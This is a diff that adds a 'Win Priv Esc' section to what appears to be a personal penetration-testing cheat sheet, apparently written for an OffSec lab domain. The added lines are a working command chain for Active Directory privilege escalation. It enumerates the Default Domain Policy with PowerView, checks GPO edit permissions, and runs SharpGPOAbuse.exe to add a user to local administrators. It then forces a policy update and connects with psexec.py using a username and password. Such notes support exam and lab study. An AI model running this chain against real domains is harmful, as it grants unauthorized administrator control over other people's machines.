@@ -217,3 +217,12 @@ shutdown /r /t 0
 
 To check if dave has been added to local admin group  
 Get-LocalGroupMember administrators
+-----------------------------------------------------------------------------------------------------------------------
+
+Win Priv Esc
+.\powerview.ps1
+Get-GPO -Name "Default Domain Policy" - the Guid we take from this command and will be Id: ....
+Get-GPPermission -Guid -TargetType User -TargetName someuser - in case we have in Permission: GpoEditDeleteModifySecurity executing SharpGPOAbuse.exe
+SharpGPOAbuse.exe --AddLocalAdmin --UserAccount someuser --GPOName "Default Domain Policy"
+gpupdate /force
+psexec.py vault.offsec/someuser:somepassword@ip
